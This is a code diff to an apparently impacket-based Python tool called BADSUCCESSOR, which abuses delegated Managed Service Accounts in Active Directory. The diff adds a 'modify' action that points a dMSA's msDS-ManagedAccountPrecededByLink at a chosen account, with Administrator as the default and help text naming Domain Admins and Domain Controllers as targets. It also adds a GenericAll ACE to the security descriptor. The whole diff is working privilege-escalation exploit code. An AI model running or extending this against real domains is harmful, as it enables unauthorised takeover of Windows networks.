@@ -26,7 +26,6 @@ import logging
 import random
 import string
 import sys
-import ssl
 import ldap3
 
 from impacket import version
@@ -92,7 +91,6 @@ class BADSUCCESSOR:
 
 
         try:
-            # Use init_ldap_session with LDAPS default, but handle Kerberos properly
             use_ldaps = (self.__method == 'LDAPS')
             
             # For Kerberos authentication, ensure proper target resolution
@@ -128,6 +126,8 @@ class BADSUCCESSOR:
             result = self.add_dmsa(ldapConnection)
         elif self.__action == 'delete':
             result = self.delete_dmsa(ldapConnection)
+        elif self.__action == 'modify':
+            result = self.modify_dmsa(ldapConnection)
         elif self.__action == 'search':
             result = self.search_ous(ldapConnection)
         else:
@@ -470,16 +470,28 @@ class BADSUCCESSOR:
             acl['Sbz1'] = 0
             acl['Sbz2'] = 0
             acl.aces = []
-            nace = ldaptypes.ACE()
-            nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-            nace['AceFlags'] = 0x00
-            acedata = ldaptypes.ACCESS_ALLOWED_ACE()
-            acedata['Mask'] = ldaptypes.ACCESS_MASK()
-            acedata['Mask']['Mask'] = 0x000F01FF
-            acedata['Sid'] = ldaptypes.LDAP_SID()
-            acedata['Sid'].fromCanonical(sid_string)
-            nace['Ace'] = acedata
-            acl.aces.append(nace)
+            
+            nace1 = ldaptypes.ACE()
+            nace1['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+            nace1['AceFlags'] = 0x00
+            acedata1 = ldaptypes.ACCESS_ALLOWED_ACE()
+            acedata1['Mask'] = ldaptypes.ACCESS_MASK()
+            acedata1['Mask']['Mask'] = 0x000F01FF
+            acedata1['Sid'] = ldaptypes.LDAP_SID()
+            acedata1['Sid'].fromCanonical(sid_string)
+            nace1['Ace'] = acedata1
+            acl.aces.append(nace1)
+            
+            nace2 = ldaptypes.ACE()
+            nace2['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+            nace2['AceFlags'] = 0x00
+            acedata2 = ldaptypes.ACCESS_ALLOWED_ACE()
+            acedata2['Mask'] = ldaptypes.ACCESS_MASK()
+            acedata2['Mask']['Mask'] = 0x10000000  # GenericAll
+            acedata2['Sid'] = ldaptypes.LDAP_SID()
+            acedata2['Sid'].fromCanonical(sid_string)
+            nace2['Ace'] = acedata2
+            acl.aces.append(nace2)
             sd['Dacl'] = acl
             return sd.getData()
         except Exception as e:
@@ -534,10 +546,10 @@ class BADSUCCESSOR:
                     entry = ldapConnection.entries[0]
                     if 'objectSid' in entry:
                         user_sid = entry.objectSid.value
-                if user_sid:
-                    descriptor = self.build_security_descriptor(user_sid)
-                    if descriptor:
-                        group_msa_membership =  descriptor
+                        if user_sid:
+                            descriptor = self.build_security_descriptor(user_sid)
+                            group_msa_membership = descriptor
+                            attributes['nTSecurityDescriptor'] = descriptor
                 
             except Exception as e:
                 logging.debug('Error building MSA membership: %s' % str(e))
@@ -590,6 +602,72 @@ class BADSUCCESSOR:
         except Exception as e:
             logging.error('dMSA creation failed: %s' % str(e))
             return False
+    
+    def modify_dmsa(self, ldapConnection):
+        try:
+            dmsa_dn = 'CN=%s,%s' % (self.__dmsaName, self.__targetOu)
+
+            if not self.check_account_exists(ldapConnection, dmsa_dn):
+                logging.error('dMSA account does not exist: %s' % dmsa_dn)
+                return False
+
+            # Get current target account value
+            success = ldapConnection.search(
+                search_base=dmsa_dn,
+                search_filter='(objectClass=msDS-DelegatedManagedServiceAccount)',
+                search_scope=ldap3.BASE,
+                attributes=['msDS-ManagedAccountPrecededByLink']
+            )
+            
+            current_target_dn = None
+            if success and len(ldapConnection.entries) > 0:
+                entry = ldapConnection.entries[0]
+                if hasattr(entry, 'msDS-ManagedAccountPrecededByLink'):
+                    current_target_dn = entry['msDS-ManagedAccountPrecededByLink'].value
+
+            success = ldapConnection.search(
+                search_base=self.__baseDN, 
+                search_filter='(&(objectClass=*)(sAMAccountName=%s))' % self.__targetAccount,
+                search_scope=ldap3.SUBTREE,
+                attributes=['distinguishedName', 'objectClass']
+            )
+
+            if not (success and len(ldapConnection.entries) > 0):
+                logging.error('Target account not found: %s' % self.__targetAccount)
+                return False
+
+            target_dn = None
+            for entry in ldapConnection.entries:
+                object_classes = [str(oc).lower() for oc in entry.objectClass.values]
+                if 'user' in object_classes or 'computer' in object_classes:
+                    target_dn = str(entry.entry_dn)
+                    break
+            
+            if not target_dn:
+                target_dn = str(ldapConnection.entries[0].entry_dn)
+
+            if current_target_dn == target_dn:
+                logging.info('Target account is already set to: %s' % target_dn)
+                logging.info('No modifications needed.')
+                return True
+
+            modifications = {
+                'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, [target_dn])]
+            }
+            
+            success = ldapConnection.modify(dmsa_dn, modifications)
+            
+            if success:
+                logging.info('dMSA target account modified: %s -> %s' % (current_target_dn or '(not set)', target_dn))
+                return True
+            else:
+                logging.error('Failed to modify dMSA: %s' % ldapConnection.result)
+                return False
+                
+        except Exception as e:
+            logging.error('Error modifying dMSA: %s' % str(e))
+            return False
+
 
 if __name__ == '__main__':
     print(version.BANNER)
@@ -598,7 +676,7 @@ if __name__ == '__main__':
 
     parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
     parser.add_argument('-dmsa-name', action='store', metavar='dmsa_name', help='Name of dMSA to add. If omitted, a random dMSA-[A-Z0-9]{8} will be used.')
-    parser.add_argument('-action', choices=['add',  'delete', 'search'], default='search', help='Action to perform: add (requires -target-ou), delete (requires -dmsa-name, -target-ou), search a dMSA.')
+    parser.add_argument('-action', choices=['add', 'delete', 'modify', 'search'], default='search', help='Action to perform: add (requires -target-ou), delete (requires -dmsa-name, -target-ou), modify (requires -dmsa-name, -target-ou and -target-account), or search a dMSA.')
     parser.add_argument('-target-ou', action='store', metavar='OU_DN', help='Specific OU to check for dMSA creation capabilities (e.g., "OU=weakOU,DC=domain,DC=local")')
     parser.add_argument('-principals-allowed', action='store', metavar='USERNAME', help='Username allowed to retrieve the managed password. If omitted, current username will be used.')
     parser.add_argument('-target-account', action='store', metavar='USERNAME', default='Administrator', help='Target user or computer account DN to set for msDS-ManagedAccountPrecededByLink (can target Domain Controllers, Domain Admins, Protected Users, etc.)')
@@ -643,6 +721,17 @@ if __name__ == '__main__':
         
         if required_args:
             parser.error('Action "delete" requires the following arguments: %s' % ', '.join(required_args))
+    
+    elif options.action == 'modify':
+        required_args = []
+        if not options.dmsa_name:
+            required_args.append('-dmsa-name')
+        if not options.target_ou:
+            required_args.append('-target-ou')
+        if not options.target_account:
+            required_args.append('-target-account')
+        if required_args:
+            parser.error('Action "modify" requires the following arguments: %s' % ', '.join(required_args))
 
     logger.init(options.ts, options.debug)
     
